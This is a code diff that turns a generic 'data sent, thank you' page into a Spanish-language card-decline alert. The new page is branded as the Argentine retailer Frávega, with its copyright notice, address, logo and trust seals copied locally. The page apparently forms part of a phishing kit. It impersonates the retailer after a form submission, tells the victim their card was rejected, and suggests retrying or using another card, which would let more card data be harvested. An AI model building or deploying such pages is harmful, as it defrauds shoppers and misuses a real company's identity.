@@ -1,12 +1,139 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>¡Gracias!</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Alerta de Rechazo de Compra</title>
+    <!-- Favicons y App Icons -->
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+<link rel="manifest" href="site.webmanifest">
+<link rel="icon" type="image/png" sizes="192x192" href="android-chrome-192x192.png">
+<link rel="icon" type="image/png" sizes="512x512" href="android-chrome-512x512.png">
+<meta name="theme-color" content="#ffffff">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff6f6;
+      color: #333;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .alert-container {
+      max-width: 600px;
+      background-color: #feeaea;
+      border: 1px solid #f5c2c2;
+      border-radius: 8px;
+      padding: 30px 40px;
+      box-shadow: 0 4px 12px rgba(255, 0, 0, 0.15);
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .icon-x {
+      color: #d93025;
+      font-size: 72px;
+      font-weight: bold;
+      line-height: 1;
+      margin-bottom: 20px;
+      user-select: none;
+    }
+
+    .alert-title {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #b22222;
+    }
+
+    .alert-text {
+      font-size: 16px;
+      line-height: 1.5;
+      text-align: left;
+      color: #4a4a4a;
+    }
+
+    .alert-text p {
+      margin: 12px 0;
+    }
+
+    .alert-text ul {
+      margin: 12px 0 20px 20px;
+      color: #b22222;
+    }
+
+    footer {
+      font-family: Arial, sans-serif;
+      font-size: 12px;
+      color: #666;
+      padding: 10px;
+      max-width: 960px;
+      text-align: center;
+    }
+
+    footer div {
+      margin-bottom: 8px;
+    }
+
+    footer img {
+      vertical-align: middle;
+    }
+
+    .footer-logos img {
+      height: 35px;
+      margin-right: 5px;
+    }
+  </style>
 </head>
 <body>
-    <h1>Datos enviados</h1>
-    <p>Gracias por completar el formulario. Te contactaremos pronto.</p>
-    <a href="index.html">Volver</a>
+  <div class="alert-container" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="icon-x" aria-hidden="true">&times;</div>
+    <div class="alert-title">Lo sentimos, no pudimos procesar su compra.</div>
+    <div class="alert-text">
+      <p>
+        Por el momento, la operación no pudo ser autorizada por la entidad emisora de su tarjeta.<br />
+        Esto puede deberse a alguno de los siguientes motivos:
+      </p>
+      <ul>
+        <li>El banco bloqueó temporalmente la compra por motivos de seguridad o prevención de fraude.</li>
+        <li>Fondos insuficientes o límite de crédito alcanzado.</li>
+        <li>El banco requiere una validación telefónica o aprobación directa del titular para continuar con la transacción.</li>
+        <li>Datos ingresados incorrectos (vencimiento, código de seguridad o número de tarjeta).</li>
+      </ul>
+      <p>
+        Le sugerimos comunicarse con el servicio de atención al cliente de su banco para verificar el motivo del rechazo y autorizar la compra virtual.
+      </p>
+      <p>
+        Si ya validó con su entidad o todo se encuentra en orden, puede volver a intentar la operación o utilizar otra tarjeta como método de pago alternativo.
+      </p>
+      <p>
+        Agradecemos su comprensión y lamentamos los inconvenientes ocasionados.
+      </p>
+    </div>
+  </div>
+
+  <footer>
+    <div>
+      <img src="images/logo-fravega.png" alt="Frávega Logo" style="height: 20px;">
+    </div>
+    <div>
+      Copyright 1972-2024 | Todos los derechos reservados Fravega.com. Frávega S.A.C.I. e I. Valentín Gómez 2813 (1191) | Capital Federal | Argentina
+    </div>
+    <div style="font-size: 11px; color: #999; line-height: 1.4; max-width: 960px; margin: auto;">
+      Las fotos son a modo ilustrativo. La venta de cualquiera de los productos publicados está sujeta a la verificación de stock. Los precios online y los planes de financiación para los productos presentados/publicados en www.fravega.com.ar y/o www.fravega.com son válidos exclusivamente para la compra vía internet en las páginas antes mencionadas. Las especificaciones técnicas y descripciones están sujetas a cambios sin previo aviso.
+    </div>
+    <div class="footer-logos" style="margin-top: 10px;">
+      <img src="images/caece_logo.gif" alt="Sello CACE">
+      <img src="images/aaip-isologo.png" alt="AAIP">
+      <img src="images/data_fiscal.png" alt="QR Fiscal">
+    </div>
+  </footer>
 </body>
 </html>
+
